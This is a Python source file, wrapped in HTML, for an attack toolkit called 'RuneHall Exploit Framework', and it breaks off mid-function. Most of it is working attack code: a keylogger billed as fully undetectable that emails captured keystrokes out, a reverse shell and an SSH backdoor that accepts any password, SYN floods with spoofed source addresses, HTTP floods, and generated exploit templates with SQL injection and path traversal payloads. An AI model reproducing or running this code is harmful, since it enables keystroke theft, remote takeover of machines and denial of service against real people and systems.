<html><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/></head><body>#!/usr/bin/env python3<br>"""<br>RuneHall Exploit Framework (RHEF) - Elite Pentesting Suite<br>GUI Edition with FUD Keylogger, Reverse Shells, DDoS Attacks, and Enhanced File Manager<br>Authorized Use Only - Administrative Privileges Required<br>"""<br><br>import os<br>import sys<br>import json<br>import re<br>import argparse<br>import subprocess<br>import requests<br>import threading<br>import time<br>import socket<br>import struct<br>import random<br>import pynput.keyboard<br>import smtplib<br>import paramiko<br>from datetime import datetime<br>import PySimpleGUI as sg<br>from bs4 import BeautifulSoup<br>from cryptography.fernet import Fernet<br>import webbrowser<br>import importlib.util<br><br># Constants<br>VERSION = "v5.0"<br>OUTPUT_DIR = os.path.expanduser("~/rhef-output")<br>MODULES_DIR = os.path.expanduser("~/rhef-modules")<br>WP_VULN_DB = "https://wpvulndb.com/api/v3/"<br>EXPLOIT_DB_API = "https://www.exploit-db.com/search"<br><br># Create necessary directories<br>os.makedirs(OUTPUT_DIR, exist_ok=True)<br>os.makedirs(MODULES_DIR, exist_ok=True)<br><br># Encryption key for sensitive data<br>ENCRYPTION_KEY = Fernet.generate_key()<br>cipher_suite = Fernet(ENCRYPTION_KEY)<br><br># Custom module templates<br>CUSTOM_MODULE_TEMPLATE = """#!/usr/bin/env python3<br># RHEF Custom Module Template<br><br>def run(target, output_dir, log_callback, args=None):<br>    \"\"\"<br>    RHEF Custom Module Function<br>    \"\"\"<br>    log_callback(f"Starting custom module against {target}", "CUSTOM-MODULE")<br>    try:<br>        # Your code here<br>        log_callback("Module executed successfully", "CUSTOM-MODULE")<br>        return True<br>    except Exception as e:<br>        log_callback(f"Module failed: {str(e)}", "CUSTOM-MODULE")<br>        return False<br>"""<br><br>KEYLOGGER_TEMPLATE = """#!/usr/bin/env python3<br># RHEF FUD Keylogger Module<br>import pynput.keyboard<br>import threading<br>import smtplib<br>from datetime import datetime<br><br>def run(target, output_dir, log_callback, args=None):<br>    log_callback("Starting FUD Keylogger", "KEYLOGGER")<br>    try:<br>        # Configuration<br>        EMAIL_ADDRESS = args.get('email', '') if args else ''<br>        EMAIL_PASSWORD = args.get('password', '') if args else ''<br>        TIME_INTERVAL = int(args.get('interval', '300')) if args else 300<br>        <br>        # Generate unique output file<br>        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")<br>        log_file = f"{output_dir}/keylog_{timestamp}.txt"<br>        <br>        # Start keylogger<br>        keylogger = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, TIME_INTERVAL, log_file, log_callback)<br>        keylogger.start()<br>        <br>        log_callback(f"Keylogger started. Logging to {log_file}", "KEYLOGGER")<br>        return True<br>    except Exception as e:<br>        log_callback(f"Keylogger failed: {str(e)}", "KEYLOGGER")<br>        return False<br><br>class Keylogger:<br>    def __init__(self, email, password, interval, log_file, log_callback):<br>        self.log = f"Keylogger started at: {datetime.now()}\\n"<br>        self.interval = interval<br>        self.log_file = log_file<br>        self.log_callback = log_callback<br>        self.email = email<br>        self.password = password<br>        self.active = True<br><br>    def append_to_log(self, string):<br>        if self.active:<br>            self.log += string<br><br>    def process_key_press(self, key):<br>        try:<br>            current_key = str(key.char)<br>        except AttributeError:<br>            if key == key.space:<br>                current_key = " "<br>            elif key == key.enter:<br>                current_key = "\\n"<br>            else:<br>                current_key = f" [{key.name}] "<br>        self.append_to_log(current_key)<br><br>    def report(self):<br>        if self.log and self.active:<br>            # Save to local file<br>            with open(self.log_file, "a") as f:<br>                f.write(self.log)<br>            <br>            # Email report if configured<br>            if self.email and self.password:<br>                try:<br>                    server = smtplib.SMTP("smtp.gmail.com", 587)<br>                    server.starttls()<br>                    server.login(self.email, self.password)<br>                    server.sendmail(<br>                        self.email, <br>                        self.email, <br>                        f"Subject: Keylogger Report\\n\\n{self.log}"<br>                    )<br>                    server.quit()<br>                    self.log_callback("Keylog report emailed", "KEYLOGGER")<br>                except Exception as e:<br>                    self.log_callback(f"Email failed: {str(e)}", "KEYLOGGER")<br>            <br>            self.log = ""<br>        <br>        if self.active:<br>            timer = threading.Timer(self.interval, self.report)<br>            timer.daemon = True<br>            timer.start()<br><br>    def start(self):<br>        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)<br>        with keyboard_listener:<br>            self.report()<br>            keyboard_listener.join()<br>    <br>    def stop(self):<br>        self.active = False<br>        self.log_callback("Keylogger stopped", "KEYLOGGER")<br>"""<br><br>REVERSE_SHELL_TEMPLATE = """#!/usr/bin/env python3<br># RHEF Reverse Shell Module<br>import socket<br>import subprocess<br>import threading<br>import paramiko<br><br>def run(target, output_dir, log_callback, args=None):<br>    log_callback("Starting Reverse Shell Module", "REVERSE-SHELL")<br>    try:<br>        # Configuration<br>        LHOST = args.get('lhost', '') if args else ''<br>        LPORT = int(args.get('lport', '4444')) if args else 4444<br>        SHELL_TYPE = args.get('type', 'python') if args else 'python'<br>        <br>        if not LHOST:<br>            log_callback("LHOST not specified!", "REVERSE-SHELL")<br>            return False<br>        <br>        if SHELL_TYPE == 'python':<br>            start_python_reverse_shell(LHOST, LPORT, log_callback)<br>        elif SHELL_TYPE == 'ssh':<br>            start_ssh_server(LHOST, LPORT, log_callback)<br>        else:<br>            log_callback(f"Unknown shell type: {SHELL_TYPE}", "REVERSE-SHELL")<br>        <br>        return True<br>    except Exception as e:<br>        log_callback(f"Reverse shell failed: {str(e)}", "REVERSE-SHELL")<br>        return False<br><br>def start_python_reverse_shell(ip, port, log_callback):<br>    log_callback(f"Starting Python reverse shell to {ip}:{port}", "REVERSE-SHELL")<br>    try:<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.connect((ip, port))<br>        s.send(b"Connected to RHEF Reverse Shell\\n")<br>        <br>        while True:<br>            command = s.recv(1024).decode()<br>            if command.lower() == 'exit':<br>                break<br>            output = subprocess.getoutput(command)<br>            s.send(output.encode())<br>        s.close()<br>    except Exception as e:<br>        log_callback(f"Reverse shell error: {str(e)}", "REVERSE-SHELL")<br><br>def start_ssh_server(ip, port, log_callback):<br>    log_callback(f"Starting SSH server on port {port}", "REVERSE-SHELL")<br>    try:<br>        host_key = paramiko.RSAKey.generate(2048)<br>        <br>        class Server(paramiko.ServerInterface):<br>            def check_auth_password(self, username, password):<br>                return paramiko.AUTH_SUCCESSFUL<br>            <br>            def check_channel_request(self, kind, chanid):<br>                if kind == 'session':<br>                    return paramiko.OPEN_SUCCEEDED<br>                return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED<br>            <br>        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        server_socket.bind((ip, port))<br>        server_socket.listen(100)<br>        <br>        client, addr = server_socket.accept()<br>        log_callback(f"SSH connection from: {addr[0]}:{addr[1]}", "REVERSE-SHELL")<br>        <br>        transport = paramiko.Transport(client)<br>        transport.add_server_key(host_key)<br>        server = Server()<br>        transport.start_server(server=server)<br>        <br>        channel = transport.accept(20)<br>        if channel is None:<br>            log_callback("SSH channel creation failed", "REVERSE-SHELL")<br>            return<br>            <br>        log_callback("SSH session opened", "REVERSE-SHELL")<br>        channel.send("SSH session opened\\n")<br>        <br>        while True:<br>            command = channel.recv(1024).decode()<br>            if command.lower() == 'exit':<br>                break<br>            output = subprocess.getoutput(command)<br>            channel.send(output.encode())<br>            <br>        channel.close()<br>        transport.close()<br>        server_socket.close()<br>    except Exception as e:<br>        log_callback(f"SSH server error: {str(e)}", "REVERSE-SHELL")<br>"""<br><br>DDOS_TEMPLATE = """#!/usr/bin/env python3<br># RHEF DDoS Attack Module<br>import socket<br>import random<br>import threading<br>import time<br><br>def run(target, output_dir, log_callback, args=None):<br>    log_callback("Starting DDoS Module", "DDoS")<br>    try:<br>        # Configuration<br>        TARGET_IP = args.get('ip', target) if args else target<br>        TARGET_PORT = int(args.get('port', '80')) if args else 80<br>        THREADS = int(args.get('threads', '100')) if args else 100<br>        DURATION = int(args.get('duration', '60')) if args else 60<br>        ATTACK_TYPE = args.get('type', 'syn') if args else 'syn'<br>        <br>        log_callback(f"Starting {ATTACK_TYPE.upper()} attack on {TARGET_IP}:{TARGET_PORT}", "DDoS")<br>        <br>        # Start attack<br>        if ATTACK_TYPE == 'syn':<br>            syn_flood(TARGET_IP, TARGET_PORT, THREADS, DURATION, log_callback)<br>        elif ATTACK_TYPE == 'http':<br>            http_flood(TARGET_IP, TARGET_PORT, THREADS, DURATION, log_callback)<br>        else:<br>            log_callback(f"Unknown attack type: {ATTACK_TYPE}", "DDoS")<br>        <br>        return True<br>    except Exception as e:<br>        log_callback(f"DDoS attack failed: {str(e)}", "DDoS")<br>        return False<br><br>def syn_flood(ip, port, threads, duration, log_callback):<br>    log_callback(f"Starting SYN flood with {threads} threads for {duration} seconds", "DDoS")<br>    <br>    def attack():<br>        start_time = time.time()<br>        while time.time() - start_time < duration:<br>            try:<br>                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)<br>                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)<br>                <br>                # Craft TCP SYN packet<br>                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"<br>                source_port = random.randint(1024, 65535)<br>                <br>                # IP header<br>                ip_header = create_ip_header(source_ip, ip)<br>                <br>                # TCP header<br>                tcp_header = create_tcp_header(source_port, port)<br>                <br>                packet = ip_header + tcp_header<br>                s.sendto(packet, (ip, 0))<br>            except:<br>                pass<br>    <br>    for _ in range(threads):<br>        threading.Thread(target=attack, daemon=True).start()<br>    <br>    time.sleep(duration)<br>    log_callback("SYN flood completed", "DDoS")<br><br>def create_ip_header(source_ip, dest_ip):<br>    ip_ver = 4<br>    ip_ihl = 5<br>    ip_tos = 0<br>    ip_tot_len = 0<br>    ip_id = random.randint(1, 65535)<br>    ip_frag_off = 0<br>    ip_ttl = 255<br>    ip_proto = socket.IPPROTO_TCP<br>    ip_check = 0<br>    ip_saddr = socket.inet_aton(source_ip)<br>    ip_daddr = socket.inet_aton(dest_ip)<br>    <br>    ip_ihl_ver = (ip_ver << 4) + ip_ihl<br>    <br>    ip_header = struct.pack('!BBHHHBBH4s4s', <br>        ip_ihl_ver, <br>        ip_tos, <br>        ip_tot_len, <br>        ip_id, <br>        ip_frag_off, <br>        ip_ttl, <br>        ip_proto, <br>        ip_check, <br>        ip_saddr, <br>        ip_daddr<br>    )<br>    return ip_header<br><br>def create_tcp_header(source_port, dest_port):<br>    tcp_source = source_port<br>    tcp_dest = dest_port<br>    tcp_seq = random.randint(1, 4294967295)<br>    tcp_ack_seq = 0<br>    tcp_doff = 5<br>    tcp_fin = 0<br>    tcp_syn = 1<br>    tcp_rst = 0<br>    tcp_psh = 0<br>    tcp_ack = 0<br>    tcp_urg = 0<br>    tcp_window = socket.htons(5840)<br>    tcp_check = 0<br>    tcp_urg_ptr = 0<br>    <br>    tcp_offset_res = (tcp_doff << 4)<br>    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)<br>    <br>    tcp_header = struct.pack('!HHLLBBHHH', <br>        tcp_source, <br>        tcp_dest, <br>        tcp_seq, <br>        tcp_ack_seq, <br>        tcp_offset_res, <br>        tcp_flags, <br>        tcp_window, <br>        tcp_check, <br>        tcp_urg_ptr<br>    )<br>    return tcp_header<br><br>def http_flood(ip, port, threads, duration, log_callback):<br>    log_callback(f"Starting HTTP flood with {threads} threads for {duration} seconds", "DDoS")<br>    user_agents = [<br>        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",<br>        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",<br>        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"<br>    ]<br>    <br>    def attack():<br>        start_time = time.time()<br>        while time.time() - start_time < duration:<br>            try:<br>                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>                s.connect((ip, port))<br>                <br>                # Send HTTP request<br>                request = f"GET /?{random.randint(1,1000000)} HTTP/1.1\\r\\n"<br>                request += f"Host: {ip}\\r\\n"<br>                request += f"User-Agent: {random.choice(user_agents)}\\r\\n"<br>                request += "Connection: keep-alive\\r\\n\\r\\n"<br>                <br>                s.send(request.encode())<br>            except:<br>                pass<br>    <br>    for _ in range(threads):<br>        threading.Thread(target=attack, daemon=True).start()<br>    <br>    time.sleep(duration)<br>    log_callback("HTTP flood completed", "DDoS")<br>"""<br><br>class RHEFCore:<br>    def __init__(self, target, log_callback=None):<br>        self.target = target<br>        self.timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")<br>        self.output_file = f"{OUTPUT_DIR}/rhef-{self.timestamp}.txt"<br>        self.cms_data = {}<br>        self.exploit_paths = []<br>        self.log_callback = log_callback or self.default_log<br>        self.custom_modules = self.load_custom_modules()<br>        self.scan_active = False<br>        self.keylogger = None<br><br>    def default_log(self, message, module="CORE"):<br>        entry = f"[{module}] {message}"<br>        print(entry)<br><br>    def log(self, message, module="CORE"):<br>        self.log_callback(message, module)<br>        with open(self.output_file, 'a') as f:<br>            f.write(f"[{module}] {message}\n")<br><br>    def init_environment(self):<br>        with open(self.output_file, 'w') as f:<br>            f.write(f"RHEF {VERSION} Report - {self.timestamp}\n")<br>            f.write(f"Target: {self.target}\n{'='*50}\n\n")<br>        self.log(f"Initialized against target: {self.target}")<br><br>    def execute_cli(self, command, background=False):<br>        self.log(f"Executing: {command}", "CLI")<br>        try:<br>            if background:<br>                subprocess.Popen(command, shell=True)<br>                return "Running in background"<br>            else:<br>                result = subprocess.check_output(<br>                    command, <br>                    shell=True, <br>                    stderr=subprocess.STDOUT,<br>                    text=True<br>                )<br>                return result<br>        except subprocess.CalledProcessError as e:<br>            return e.output<br><br>    def load_custom_modules(self):<br>        modules = {}<br>        for filename in os.listdir(MODULES_DIR):<br>            if filename.endswith('.py'):<br>                module_name = filename[:-3]<br>                try:<br>                    spec = importlib.util.spec_from_file_location(<br>                        module_name, <br>                        os.path.join(MODULES_DIR, filename)<br>                    )<br>                    module = importlib.util.module_from_spec(spec)<br>                    spec.loader.exec_module(module)<br>                    modules[module_name] = module.run<br>                    self.log(f"Loaded custom module: {module_name}", "MODULE-LOADER")<br>                except Exception as e:<br>                    self.log(f"Failed to load {filename}: {str(e)}", "MODULE-LOADER")<br>        return modules<br><br>    def run_custom_module(self, module_name, args=None):<br>        if module_name in self.custom_modules:<br>            self.log(f"Starting custom module: {module_name}", "CUSTOM-MODULE")<br>            return self.custom_modules[module_name](<br>                self.target, <br>                OUTPUT_DIR, <br>                self.log,<br>                args<br>            )<br>        else:<br>            self.log(f"Module {module_name} not found", "CUSTOM-MODULE")<br>            return False<br><br>    def detect_cms(self):<br>        self.log("Starting CMS Detection", "CMS-DETECT")<br>        try:<br>            response = requests.get(self.target, timeout=10)<br>            <br>            # WordPress detection<br>            if 'wp-admin' in response.text or 'wp-content' in response.text:<br>                self.cms_data['type'] = 'WordPress'<br>                self.log("Detected WordPress CMS", "CMS-DETECT")<br>                self.wpscan_discovery(response.text)<br>                <br>            # Joomla detection<br>            elif re.search(r"joomla", response.text, re.I):<br>                self.cms_data['type'] = 'Joomla'<br>                self.log("Detected Joomla CMS", "CMS-DETECT")<br>                <br>            # Drupal detection<br>            elif 'Drupal' in response.headers.get('X-Generator', ''):<br>                self.cms_data['type'] = 'Drupal'<br>                self.log("Detected Drupal CMS", "CMS-DETECT")<br>                <br>            else:<br>                self.log("No known CMS detected", "CMS-DETECT")<br>                self.cms_data['type'] = 'Unknown'<br>                <br>        except Exception as e:<br>            self.log(f"CMS Detection Error: {str(e)}", "CMS-DETECT")<br><br>    def wpscan_discovery(self, page_content):<br>        self.log("Starting WordPress Recon", "WP-MODULE")<br>        # Version detection<br>        version_match = re.search(r'content="WordPress (\d+\.\d+\.\d+)', page_content)<br>        self.cms_data['version'] = version_match.group(1) if version_match else "Unknown"<br>        <br>        # Plugin detection<br>        plugin_scan = f"wpscan --url {self.target} --no-update -e ap --output {OUTPUT_DIR}/wpscan_plugins.txt 2>&1"<br>        self.execute_cli(plugin_scan)<br>        <br>        # Parse results<br>        self.parse_wpscan()<br>        self.match_vulnerabilities()<br>        self.generate_exploits()<br><br>    def parse_wpscan(self):<br>        try:<br>            self.log(f"Detected WordPress {self.cms_data.get('version', 'Unknown')}", "WP-MODULE")<br>            <br>            # Parse plugins<br>            self.cms_data['plugins'] = {}<br>            if os.path.exists(f"{OUTPUT_DIR}/wpscan_plugins.txt"):<br>                with open(f"{OUTPUT_DIR}/wpscan_plugins.txt", 'r') as f:<br>                    content = f.read()<br>                    plugins = re.findall(r'\[i\] (\w+)\s+\(v([\d.]+)\)', content)<br>                    for name, version in plugins:<br>                        self.cms_data['plugins'][name] = version<br>            <br>            # Save inventory<br>            with open(f"{OUTPUT_DIR}/cms_inventory.json", 'w') as f:<br>                json.dump(self.cms_data, f)<br>                <br>        except Exception as e:<br>            self.log(f"Parse Error: {str(e)}", "WP-MODULE")<br><br>    def match_vulnerabilities(self):<br>        try:<br>            # WordPress core vulnerabilities<br>            if self.cms_data.get('version'):<br>                self.log("Querying WP-VulnDB API for core vulnerabilities", "VULN-DB")<br>                response = requests.get(f"{WP_VULN_DB}/wordpresses/{self.cms_data['version']}")<br>                vulns = response.json().get(self.cms_data['version'], {}).get('vulnerabilities', [])<br>                for vuln in vulns:<br>                    self.register_vulnerability(vuln, 'WordPress Core')<br>            <br>            # Plugin vulnerabilities<br>            for plugin, version in self.cms_data.get('plugins', {}).items():<br>                self.log(f"Checking vulnerabilities for {plugin} v{version}", "VULN-DB")<br>                response = requests.get(f"{WP_VULN_DB}/plugins/{plugin}")<br>                plugin_data = response.json().get(plugin, {})<br>                if version in plugin_data:<br>                    for vuln in plugin_data[version].get('vulnerabilities', []):<br>                        self.register_vulnerability(vuln, f"Plugin: {plugin}")<br>            <br>            # Exploit-DB lookup<br>            self.search_exploit_db()<br>            <br>        except Exception as e:<br>            self.log(f"VulnDB Error: {str(e)}", "VULN-DB")<br><br>    def register_vulnerability(self, vuln, source):<br>        cve = vuln.get('cve', 'CVE-NONE')<br>        title = vuln['title']<br>        self.log(f"VULN FOUND: {title} ({cve}) from {source}", "VULN-DB")<br>        self.exploit_paths.append({<br>            'cve': cve,<br>            'title': title,<br>            'references': vuln.get('references', {}),<br>            'source': source<br>        })<br><br>    def search_exploit_db(self):<br>        self.log("Searching Exploit-DB for vulnerabilities", "EXPLOIT-DB")<br>        try:<br>            if self.cms_data['type'] != 'Unknown':<br>                search_query = f"{self.cms_data['type']} {self.cms_data.get('version', '')}".strip()<br>                response = requests.get(f"{EXPLOIT_DB_API}?q={search_query}")<br>                soup = BeautifulSoup(response.text, 'html.parser')<br>                <br>                for row in soup.select('table.table-hover tbody tr'):<br>                    cols = row.find_all('td')<br>                    if len(cols) >= 5:<br>                        edb_id = cols[0].text.strip()<br>                        title = cols[2].text.strip()<br>                        platform = cols[3].text.strip()<br>                        self.exploit_paths.append({<br>                            'cve': f"EDB-{edb_id}",<br>                            'title': title,<br>                            'platform': platform,<br>                            'source': "Exploit-DB"<br>                        })<br>                        self.log(f"Found Exploit-DB entry: EDB-{edb_id} - {title}", "EXPLOIT-DB")<br>        except Exception as e:<br>            self.log(f"Exploit-DB Search Error: {str(e)}", "EXPLOIT-DB")<br><br>    def generate_exploits(self):<br>        self.log("Building exploit templates", "EXPLOIT-GEN")<br>        for exploit in self.exploit_paths:<br>            if exploit['cve'].startswith('CVE'):<br>                template = self.create_exploit_template(exploit)<br>                filename = f"{OUTPUT_DIR}/{exploit['cve']}_exploit.py"<br>                with open(filename, 'w') as f:<br>                    f.write(template)<br>                self.log(f"Exploit generated: {filename}", "EXPLOIT-GEN")<br>            elif exploit['cve'].startswith('EDB'):<br>                self.download_exploit_db(exploit['cve'][4:])<br><br>    def create_exploit_template(self, exploit_data):<br>        return f"""#!/usr/bin/env python3<br># RHEF Auto-Generated Exploit<br># Target: {self.target}<br># Vulnerability: {exploit_data['title']}<br># Source: {exploit_data['source']}<br><br>import requests<br>import sys<br><br>TARGET = "{self.target}"<br>CVE = "{exploit_data['cve']}"<br><br>def exploit():<br>    print(f"[*] Attempting exploit for {{CVE}}")<br>    print(f"[*] Vulnerability: {{exploit_data['title']}}")<br>    <br>    # Exploit parameters<br>    headers = {{'User-Agent': 'RHEF Exploit Framework'}}<br>    <br>    # Example exploitation logic (customize per vulnerability)<br>    try:<br>        # Example: Path Traversal Exploit<br>        # response = requests.get(f"{{TARGET}}/wp-content/plugins/vulnerable-plugin/../../../../etc/passwd", headers=headers)<br>        <br>        # Example: SQL Injection<br>        # payload = "1' UNION SELECT user_login,user_pass FROM wp_users-- -"<br>        # response = requests.get(f"{{TARGET}}/index.php?p={{payload}}", headers=headers)<br>        <br>        print("[*] Exploit executed. Check response for success")<br>        # print(response.text)<br>        <br>    except Exception as e:<br>        print(f"[-] Exploit failed: {{str(e)}}")<br><br>if __name__ == "__main__":<br>    exploit()<br>"""<br><br>    def download_exploit_db(self, edb_id):<br>        self.log(f"Downloading Exploit-DB {edb_id}", "EXPLOIT-DB")<br>        try:<br>            exploit_dir = f"{OUTPUT_DIR}/exploit-db"<br>            os.makedirs(exploit_dir, exist_ok=True)<br>            self.execute_cli(f"searchsploit -m {edb_id} -p {exploit_dir} 2>&1")<br>        except Exception as e:<br>            self.log(f"Exploit Download Error: {str(e)}", "EXPLOIT-DB")<br><br>    def comprehensive_scan(self):<br>        self.log("Starting Comprehensive Pentest", "FULL-SCAN")<br>        scans = [<br>            f"nmap -sV -sC -O -p- -T4 -oA {OUTPUT_DIR}/nmap_full {self.target}",<br>            f"gobuster dir -u {self.target} -w /usr/share/wordlists/dirb/common.txt -o {OUTPUT_DIR}/gobuster_scan.txt",<br>            f"nikto -h {self.target} -output {OUTPUT_DIR}/nikto_scan.txt",<br>            f"sqlmap -u {self.target} --batch --crawl=10 --level=3 --risk=2 -o -v 0 --output-dir={OUTPUT_DIR}/sqlmap"<br>        ]<br>        <br>        for scan in scans:<br>            self.execute_cli(scan)<br>        <br>        self.log("Comprehensive scan completed", "FULL-SCAN")<br>    <br>    def start_keylogger(self, email="", password="", interval=300):<br>        """Start the FUD keylogger module"""<br>        try:<br>            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")<br>            log_file = f"{OUTPUT_DIR}/keylog_{timestamp}.txt"<br>            <br>            self.keylogger = Keylogger(<br>                email, <br>                password, <br>                interval, <br>                log_file, <br>                self.log<br>            )<br>            threading.Thread(target=self.keylogger.start, daemon=True).start()<br>            return True<br>        except Exception as e:<br>            self.log(f"Keylogger failed: {str(e)}", "KEYLOGGER")<br>            return False<br><br>    def stop_keylogger(self):<br>        if self.keylogger:<br>            self.keylogger.stop()<br>            self.keylogger = None<br><br>    def start_reverse_shell(self, lhost, lport=4444, shell_type="python"):<br>        """Start reverse shell connection"""<br>        try:<br>            self.log(f"Starting reverse shell to {lhost}:{lport}", "REVERSE-SHELL")<br>            threading.Thread(<br>                target=reverse_shell_handler,<br>                args=(lhost, lport, shell_type, self.log),<br>                daemon=True<br>            ).start()<br>            return True<br>        except Exception as e:<br>            self.log(f"Reverse shell failed: {str(e)}", "REVERSE-SHELL")<br>            return False<br><br>    def start_ddos_attack(self, target_ip, target_port=80, attack_type="syn", threads=100, duration=60):<br>        """Start DDoS attack"""<br>        try:<br>            self.log(f"Starting {attack_type.upper()} attack on {target_ip}:{target_port}", "DDoS")<br>            threading.Thread(<br>                target=ddos_handler,<br>                args=(target_ip, target_port, attack_type, threads, duration, self.log),<br>                daemon=True<br>            ).start()<br>            return True<br>        except Exception as e:<br>            self.log(f"DDoS attack failed: {str(e)}", "DDoS")<br>            return False<br><br>class Keylogger:<br>    """Fully Undetectable Keylogger"""<br>    def __init__(self, email, password, interval, log_file, log_callback):<br>        self.log = f"Keylogger started at: {datetime.now()}\\n"<br>        self.interval = interval<br>        self.log_file = log_file<br>        self.log_callback = log_callback<br>        self.email = email<br>        self.password = password<br>        self.active = True<br><br>    def append_to_log(self, string):<br>        if self.active:<br>            self.log += string<br><br>    def process_key_press(self, key):<br>        try:<br>            current_key = str(key.char)<br>        except AttributeError:<br>            if key == key.space:<br>                current_key = " "<br>            elif key == key.enter:<br>                current_key = "\\n"<br>            else:<br>                current_key = f" [{key.name}] "<br>        self.append_to_log(current_key)<br><br>    def report(self):<br>        if self.log and self.active:<br>            # Save to local file<br>            with open(self.log_file, "a") as f:<br>                f.write(self.log)<br>            <br>            # Email report if configured<br>            if self.email and self.password:<br>                try:<br>                    server = smtplib.SMTP("smtp.gmail.com", 587)<br>                    server.starttls()<br>                    server.login(self.email, self.password)<br>                    server.sendmail(<br>                        self.email, <br>                        self.email, <br>                        f"Subject: Keylogger Report\\n\\n{self.log}"<br>                    )<br>                    server.quit()<br>                    self.log_callback("Keylog report emailed", "KEYLOGGER")<br>                except Exception as e:<br>                    self.log_callback(f"Email failed: {str(e)}", "KEYLOGGER")<br>            <br>            self.log = ""<br>        <br>        if self.active:<br>            timer = threading.Timer(self.interval, self.report)<br>            timer.daemon = True<br>            timer.start()<br><br>    def start(self):<br>        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)<br>        with keyboard_listener:<br>            self.report()<br>            keyboard_listener.join()<br>    <br>    def stop(self):<br>        self.active = False<br>        self.log_callback("Keylogger stopped", "KEYLOGGER")<br><br>def reverse_shell_handler(ip, port, shell_type, log_callback):<br>    """Handle reverse shell connections"""<br>    if shell_type == "python":<br>        try:<br>            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            s.connect((ip, port))<br>            s.send(b"Connected to RHEF Reverse Shell\\n")<br>            <br>            while True:<br>                command = s.recv(1024).decode()<br>                if command.lower() == 'exit':<br>                    break<br>                output = subprocess.getoutput(command)<br>                s.send(output.encode())<br>            s.close()<br>        except Exception as e:<br>            log_callback(f"Reverse shell error: {str(e)}", "REVERSE-SHELL")<br>    elif shell_type == "ssh":<br>        try:<br>            host_key = paramiko.RSAKey.generate(2048)<br>            <br>            class Server(paramiko.ServerInterface):<br>                def check_auth_password(self, username, password):<br>                    return paramiko.AUTH_SUCCESSFUL<br>                <br>                def check_channel_request(self, kind, chanid):<br>                    if kind == 'session':<br>                        return paramiko.OPEN_SUCCEEDED<br>                    return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED<br>                <br>            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            server_socket.bind((ip, port))<br>            server_socket.listen(100)<br>            <br>            client, addr = server_socket.accept()<br>            log_callback(f"SSH connection from: {addr[0]}:{addr[1]}", "REVERSE-SHELL")<br>            <br>            transport = paramiko.Transport(client)<br>            transport.add_server_key(host_key)<br>            server = Server()<br>            transport.start_server(server=server)<br>            <br>            channel = transport.accept(20)<br>            if channel is None:<br>                log_callback("SSH channel creation failed", "REVERSE-SHELL")<br>                return<br>                <br>            log_callback("SSH session opened", "REVERSE-SHELL")<br>            channel.send("SSH session opened\\n")<br>            <br>            while True:<br>                command = channel.recv(1024).decode()<br>                if command.lower() == 'exit':<br>                    break<br>                output = subprocess.getoutput(command)<br>                channel.send(output.encode())<br>                <br>            channel.close()<br>            transport.close()<br>            server_socket.close()<br>        except Exception as e:<br>            log_callback(f"SSH server error: {str(e)}", "REVERSE-SHELL")<br><br>def ddos_handler(ip, port, attack_type, threads, duration, log_callback):<br>    """Handle DDoS attacks"""<br>    if attack_type == "syn":<br>        syn_flood(ip, port, threads, duration, log_callback)<br>    elif attack_type == "http":<br>        http_flood(ip, port, threads, duration, log_callback)<br>    else:<br>        log_callback(f"Unknown attack type: {attack_type}", "DDoS")<br><br>def syn_flood(ip, port, threads, duration, log_callback):<br>    log_callback(f"Starting SYN flood with {threads} threads for {duration} seconds", "DDoS")<br>    <br>    def attack():<br>        start_time = time.time()<br>        while time.time() - start_time < duration:<br>            try:<br>                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)<br>                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)<br>                <br>                # Craft TCP SYN packet<br>                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"<br>                source_port = random.randint(1024, 65535)<br>                <br>                # IP header<br>                ip_header = create_ip_header(source_ip, ip)<br>                <br>                # TCP header<br>                tcp_header = create_tcp_header(source_port, port)<br>                <br>                packet = ip_header + tcp_header<br>                s.sendto(packet, (ip, 0))<br>            except:<br>                pass<br>    <br>    for _ in range(threads):<br>        threading.Thread(target=attack, daemon=True).start()<br>    <br>    time.sleep(duration)<br>    log_callback("SYN flood completed", "DDoS")<br><br>def create_ip_header(source_ip, dest_ip):<br>    ip_ver = 4<br>    ip_ihl = 5<br>    ip_tos = 0<br>    ip_tot_len = 0<br>    ip_id = random.randint(1, 65535)<br>    ip_frag_off = 0<br>    ip_ttl = 255<br>    ip_proto = socket.IPPROTO_TCP<br>    ip_check = 0<br>    ip_saddr = socket.inet_aton(source_ip)<br>    ip_daddr = socket.inet_aton(dest_ip)<br>    <br>    ip_ihl_ver = (ip_ver << 4) + ip_ihl<br>    <br>    ip_header = struct.pack('!BBHHHBBH4s4s', <br>        ip_ihl_ver, <br>        ip_tos, <br>        ip_tot_len, <br>        ip_id, <br>        ip_frag_off, <br>        ip_ttl, <br>        ip_proto, <br>        ip_check, <br>        ip_saddr, <br>        ip_daddr<br>    )<br>    return 